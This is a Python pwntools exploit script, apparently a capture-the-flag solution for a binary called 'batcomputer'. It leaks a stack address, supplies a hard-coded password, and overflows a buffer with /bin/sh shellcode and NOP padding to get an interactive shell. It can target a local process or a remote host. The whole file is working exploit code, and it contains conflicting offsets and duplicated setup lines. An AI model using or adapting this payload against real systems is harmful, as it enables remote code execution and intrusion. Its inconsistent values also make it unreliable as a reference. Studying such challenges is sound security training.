from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg,
b *0x7fffffffdd38,
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './batcomputer'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP, found manually with GDB
offset = 264

# Start program
io = start()

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Set the binary context
context.binary = exe

# Offset between buffer and return instruction pointer
offset = 137 
return_address_offset = 84
max_payload_length = 137


p = start()
#p.sendline("165.232.42.197 31713" )

# Step 0:
# Enumerate the binary
password = "b4tp@$$w0rd!"
return_address_offset = 84

# Step 1:
# Leak the vulnerable stack address:
p.sendlineafter('> ', '1')
leak = p.recvline()
leak = leak.strip(b"It was very hard, but Alfred managed to locate him: ")
leak = leak.strip(b"\n")
log.debug(f"{leak=}")

# Convert leaked address to an int:
stack_address = int(leak, 16)

# Ensure the address is 8 bytes:
#stack_address = stack_address.rjust(8, '\x00')

log.success(f"Leaked stack address: {stack_address}")

# Step 2:
# Buffer overflow
p.sendlineafter('> ', '2')
p.sendlineafter('password: ', password)

# Build shellcode
#shellcode = asm(shellcraft.popad() + shellcraft.sh())
shellcode = asm(shellcraft.sh())
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b"".join([
    shellcode,
    asm('nop') * (return_address_offset - len(shellcode)),
    p64(stack_address)
])
# padding = asm('nop')*return_address_offset
# payload = padding + p64(stack_address + return_address_offset + 8) + shellcode

# payload = shellcode
# payload += asm('nop')*(84 - len(shellcode))
# payload += p64(stack_address)

assert len(payload) <= max_payload_length, f"payload {len(payload)} too long. Allowed: {max_payload_length}"

# Write payload to file
write('payload', payload)

p.sendlineafter('commands: ', payload)

# Step 3 
# Trigger return
p.sendlineafter('> ', '3')

p.interactive()
